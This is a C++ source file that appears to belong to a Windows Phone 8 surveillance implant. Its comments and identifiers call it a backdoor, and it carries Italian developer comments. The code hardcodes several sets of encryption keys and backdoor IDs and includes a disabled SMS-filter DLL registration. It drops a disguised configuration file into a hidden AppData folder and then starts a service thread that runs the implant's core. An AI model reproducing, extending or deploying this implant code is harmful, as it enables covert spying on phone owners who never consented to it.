////#include "pch.h"
extern "C" int mornellaStart(void);

///#include <windows.h>
#include "Core.h"

#include <thread>
#include <chrono>


#include <stdio.h>
#include <common_new\service.h>

#include "FunctionFunc.h"

#include "Log.h"


// Keep track of the service status
DWORD g_dwServiceState;

// Global critical section
CRITICAL_SECTION g_cs;

// Handle to the worker thread
HANDLE g_hThread;

// Core Procedure
extern "C" DWORD WINAPI CoreProc(LPVOID lpv);

// Use CE's built-in debugging framework.
#ifdef _DEBUG

DBGPARAM dpCurSettings = {
	TEXT("bthclient"), {
		TEXT("Error"),TEXT("Init"),TEXT("Net Client"),TEXT("Interface"),
			TEXT("API"),TEXT(""),TEXT(""),TEXT(""),
			TEXT(""),TEXT(""),TEXT(""),TEXT(""),
			TEXT(""),TEXT(""),TEXT(""),TEXT("") },
			0x0007  // Turn on Error, Init, and Client DEBUGZONE's by default
};

#define ZONE_ERROR  DEBUGZONE(0)
#define ZONE_INIT   DEBUGZONE(1)
#define ZONE_CLIENT DEBUGZONE(2)
#define ZONE_INTRF  DEBUGZONE(3)
#define ZONE_API    DEBUGZONE(4)
#define ZONE_NET    DEBUGZONE(5)
#endif

extern "C" DWORD WINAPI CoreProc(LPVOID pParam) {
	MEMORY_BASIC_INFORMATION mbi;
	static INT dummy_info;
	HMODULE hSmsFilter = NULL;
	typedef HRESULT (*pRegister)();
	Core *core = NULL;



	// configurazione artificialee
	
	/*	wp8mobile			  
	BYTE LogKey[] = { 0x8f, 0xd1, 0x17, 0x03, 0x52, 0x96, 0x71, 0xf7, 0xf8, 0x43, 0xe6, 0x5e, 0xde, 0x33, 0xb1, 0x75d };					  
	BYTE ConfKey[] = { 0x45, 0x1e, 0x33, 0x6c, 0x97, 0x8e, 0x71, 0x7b, 0x0c, 0x38, 0x9b, 0x2c, 0x2b, 0x66, 0x75, 0x04 };					  
	BYTE ProtoKey[] = { 0x49, 0x8c, 0xe4, 0xd4, 0x31, 0xd7, 0x69, 0x8d, 0x6d, 0xa7, 0x6e, 0x87, 0xdc, 0x50, 0x13, 0xfcb };
	*/

	//wp8 v1 su 172.20.20.171:4444
	/*
	BYTE LogKey[] = { 0x06, 0x67, 0xa7, 0xe9, 0xc5, 0x6c, 0xef, 0xd8, 0xfd, 0xb4, 0xa3, 0x2b, 0x54, 0x9c, 0xcb, 0xe0 };					  
	BYTE ConfKey[] = { 0xd0, 0x3f, 0xab, 0x5d, 0x4d, 0xdd, 0x7d, 0x7c, 0x95, 0xec, 0x17, 0xfa, 0x16, 0x01, 0x4c, 0xb2 };					  
	BYTE ProtoKey[] = { 0x57, 0x2e, 0xbc, 0x94, 0x39, 0x12, 0x81, 0xcc, 0xf5, 0x3a, 0x85, 0x13, 0x30, 0xbb, 0x0d, 0x99 };
	*/

	//wp8 v2 
	/***
	BYTE LogKey[] = { 0x9f, 0x1c, 0x2a, 0x26, 0x7c, 0xe7, 0x2d, 0xd9, 0x23, 0x5b, 0xa1, 0x93, 0xfb, 0x57, 0xa3, 0x05 };
	BYTE ConfKey[] = { 0xfe, 0x73, 0xfa, 0xce, 0xea, 0xf3, 0x71, 0xcd, 0xa0, 0x23, 0x63, 0x45, 0x21, 0x98, 0xaf, 0x36 };
	BYTE ProtoKey[] = { 0x57, 0x2e, 0xbc, 0x94, 0x39, 0x12, 0x81, 0xcc, 0xf5, 0x3a, 0x85, 0x13, 0x30, 0xbb, 0x0d, 0x99 };
	***/

#ifdef _DEBUG
	//wp8 v3 su castore
	
	BYTE LogKey[] = { 0x14, 0x78, 0xbe, 0x89, 0xbf, 0x52, 0x47, 0x45, 0x28, 0x8c, 0xa5, 0xff, 0xa1, 0x23, 0x68, 0x78 };
	BYTE ConfKey[] = { 0x94, 0xbf, 0x39, 0x0a, 0xb8, 0xbb, 0x53, 0x42, 0x78, 0x6f, 0xa3, 0x28, 0xbd, 0x91, 0x7a, 0x15 };
	BYTE ProtoKey[] = { 0x57, 0x2e, 0xbc, 0x94, 0x39, 0x12, 0x81, 0xcc, 0xf5, 0x3a, 0x85, 0x13, 0x30, 0xbb, 0x0d, 0x99 };



//wp8 v4 su castore
	
	//BYTE LogKey[] =   { 0x9b, 0xd8, 0xd5, 0x0a, 0xb7, 0xe6, 0x3c, 0xa5, 0xca, 0x4e, 0x24, 0x81, 0x86, 0xe2, 0xfe, 0x63 };
	//BYTE ConfKey[] =  { 0x51, 0x24, 0xed, 0xe9, 0x6a, 0xd5, 0x03, 0x03, 0xe5, 0x91, 0xdf, 0x43, 0xe6, 0xfe, 0xe6, 0x7c };
	//BYTE ProtoKey[] = { 0x57, 0x2e, 0xbc, 0x94, 0x39, 0x12, 0x81, 0xcc, 0xf5, 0x3a, 0x85, 0x13, 0x30, 0xbb, 0x0d, 0x99 };

#endif		
 

	//wp8 v1 polluce
	// "logkey": "adbOtfWh7p77a6J_88VUY2Vrq2D1CTml",
    // "confkey": "ESsSlxgOmDIE7_bsdr9SDn7rpJLp9kh6"
	// globe sign: 55466b842bd70449af90ccac969c21f3

	//BYTE LogKey[] = "adbOtfWh7p77a6J_";
	//BYTE ConfKey[] = "ESsSlxgOmDIE7_bs";
	//BYTE ProtoKey[] = "55466b842bd70449";
	/*
	BYTE LogKey[] = { 0x61, 0x64, 0x62, 0x4f, 0x74, 0x66, 0x57, 0x68, 0x37, 0x70, 0x37, 0x37, 0x61, 0x36, 0x4a, 0x5f };
	BYTE ConfKey[] = { 0x45, 0x53, 0x73, 0x53, 0x6c, 0x78, 0x67, 0x4f, 0x6d, 0x44, 0x49, 0x45, 0x37, 0x5f, 0x62, 0x73 };
	BYTE ProtoKey[] = { 0x35, 0x35, 0x34, 0x36, 0x36, 0x62, 0x38, 0x34, 0x32, 0x62, 0x64, 0x37, 0x30, 0x34, 0x34, 0x39 };


	Using factory: RCS_0000000308 windows phone 8
 -> LOGKEY   : 0x11, 0xbd, 0xeb, 0x67, 0x85, 0xd0, 0xd3, 0x05, 0xac, 0x56, 0x15, 0x77, 0x44, 0x68, 0x67, 0xee ceb0fb89268d995d4d47d464c7667773
 -> CONFKEY  : 0x4c, 0xc0, 0x5a, 0x5d, 0x1b, 0xb5, 0x3d, 0x18, 0x2c, 0x2c, 0x4a, 0x64, 0x82, 0x02, 0x6e, 0xe6 eb6de2ae521dceb0cb521eecc737f50e
 -> SIGNATURE: 0x66, 0x3b, 0xa6, 0x70, 0x50, 0x2a, 0x7b, 0xe4, 0x68, 0xf7, 0x00, 0x79, 0xfb, 0x69, 0xee, 0xfd c405e69ca97a5853146f6612a74d9aec
 */

/*
	//Polluce v2 RCS_0000000308
	BYTE LogKey[] = { 0x11, 0xbd, 0xeb, 0x67, 0x85, 0xd0, 0xd3, 0x05, 0xac, 0x56, 0x15, 0x77, 0x44, 0x68, 0x67, 0xee };
	BYTE ConfKey[] = { 0x4c, 0xc0, 0x5a, 0x5d, 0x1b, 0xb5, 0x3d, 0x18, 0x2c, 0x2c, 0x4a, 0x64, 0x82, 0x02, 0x6e, 0xe6 };
	BYTE ProtoKey[] = { 0x66, 0x3b, 0xa6, 0x70, 0x50, 0x2a, 0x7b, 0xe4, 0x68, 0xf7, 0x00, 0x79, 0xfb, 0x69, 0xee, 0xfd };
*/

	/*
	 -> LOGKEY   : 1478be89bf524745288ca5ffa12368789d4744c37194a3dad9cfebf4e49b82ea
 -> CONFKEY  : 94bf390ab8bb5342786fa328bd917a15509e93c1c62f211747b210f19218c9f4
 -> SIGNATURE: 572ebc94391281ccf53a851330bb0d99d7175e28999fce6ee4e7898ab8ba1374
	*/
	
	//g_hInstance = hInstance;
/*****/
#ifdef _DEBUG
	// Configurazione artificiale di alcune variabili
	
	ZeroMemory(g_AesKey, 32);
	ZeroMemory(g_ConfKey, 32);
	ZeroMemory(g_Challenge, 32);
	

	CopyMemory(g_AesKey, LogKey, 16);
	CopyMemory(g_ConfKey, ConfKey, 16);
	CopyMemory(g_Challenge, ProtoKey, 16);
	
	

	ZeroMemory(g_BackdoorID, 16);
	//wp8 v3 castore
	CopyMemory(g_BackdoorID, "RCS_0000001343", strlen("RCS_0000001343"));

	//wp8 v4 castore
	//CopyMemory(g_BackdoorID, "RCS_0000001611", strlen("RCS_0000001611"));
							    
	//wp8 v2 polluce
    //CopyMemory(g_BackdoorID, "RCS_0000000308", strlen("RCS_0000000308"));

	//ZeroMemory(g_ConfName,WideLen(L"fmh58t4.wph"));
	//CopyMemory(g_ConfName, L"fmh58t4.wph", WideLen(L"fmh58t4.wph"));

#endif
/****/
	// Fine configurazione artificiale


	// Installiamo la DLL
///	pRegister RegisterFunction;

	ADDDEMOMESSAGE(L"SMS Filter... ");
/***
	// Registriamo la DLL per il filtering degli SMS
	hSmsFilter = LoadLibraryExW(L"SmsFilter.dll",NULL,0);

	if (hSmsFilter != NULL) {
		RegisterFunction = (pRegister)GetProcAddress(hSmsFilter, (LPCSTR)L"DllRegisterServer");

		if(RegisterFunction != NULL) {
			RegisterFunction();
		}

		FreeLibrary(hSmsFilter);

		ADDDEMOMESSAGE(L"OK\n");
	} else {
		ADDDEMOMESSAGE(L"Failed\n");
	}
***/
	//

	// Sporco trick per ottenere l'HMODULE della nostra DLL dal momento
	// che la DllMain() non viene mai chiamata se veniamo caricati come
	// servizio.
	VirtualQuery(&dummy_info, &mbi, sizeof(mbi));
	g_hInstance = reinterpret_cast<HMODULE>(mbi.AllocationBase);

	core = new(std::nothrow) Core();

	if (core == NULL)
		return 0;

	core->Run();
	
	delete core;
	return 1;
}

BOOL BTC_Init(DWORD dwData) {
	//DEBUGMSG(ZONE_INTRF,(L"Mornella: BTC_Init(0x%08x)\r\n", dwData));
	///EnterCriticalSection(&g_cs);

	g_hThread = _CreateThread(0, 0, CoreProc, 0, 0, 0);

	if (g_dwServiceState != SERVICE_STATE_UNINITIALIZED) {
		// Someone is trying to load multiple times (for example, trying to create "BTC1:").
		//DEBUGMSG(ZONE_ERROR, (L"Mornella: ERROR: BTC service already initialized\r\n"));
		///LeaveCriticalSection(&g_cs);
		return FALSE;
	}

	g_dwServiceState = SERVICE_STATE_STARTING_UP; 

	//DEBUGMSG(ZONE_INIT,(L"Mornella: BTC_Init success - service is in starting up state\r\n"));
	///LeaveCriticalSection(&g_cs);

	return TRUE;
}

BOOL BTC_Deinit(DWORD dwData) {

	DBG_MSG(L"BTC_Deinit");
	//DEBUGMSG(ZONE_INTRF,(L"Mornella: BTC_DeInit(0x%08x)\r\n", dwData));

	///EnterCriticalSection(&g_cs);
	g_dwServiceState = SERVICE_STATE_UNLOADING;

	if (g_hThread) {
		//DEBUGMSG(ZONE_INIT,(L"Mornella: Waiting for worker thread to complete before service shutdown\r\n"));
		HANDLE hWorker = g_hThread;
		///LeaveCriticalSection (&g_cs);

		// Block until the worker is through running.
		_WaitForSingleObject(hWorker, INFINITE);
	} else {
		///LeaveCriticalSection(&g_cs);          
	}

	// Service is unloaded no matter what is returned.
	//DEBUGMSG(ZONE_INIT,(L"Mornella: Completed shutdown.  Returning to services.exe for unload\r\n"));

	return TRUE;
}












int mornellaStart(void)
{
	/*
		Windows::Foundation::TimeSpan span;
		span.Duration = 10000000L;   // convert 1 sec to 100ns ticks
	 
		Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
		vibr->Vibrate(span);
	*/
		

		COPYFILE2_EXTENDED_PARAMETERS copyParams = {
		  sizeof(copyParams), COPY_FILE_FAIL_IF_EXISTS, NULL, NULL, NULL
	   };

	   CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);

	   //vedere perche' in release il file dovrebbe chiamarsi fmh58t4.wph
	   HRESULT  hCF=CopyFile2(L".\\fmh58t4.wph",L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\fmh58t4.wph",  &copyParams);
			   

#ifdef _DEBUG
	   if (hCF == HRESULT_FROM_WIN32(ERROR_FILE_EXISTS))
	   {
		 OutputDebugString(L"Il file di Configurazione è gia' presente per cui non lo sostituisco");
	   }
	   if (hCF == S_OK)
	   {
		 OutputDebugString(L"Installo la conf per la prima volta");
	   }
#endif
		
			

		BTC_Init(0x0);

		for (;;) std::this_thread::sleep_for(std::chrono::milliseconds(20000));

		return 0;
	
}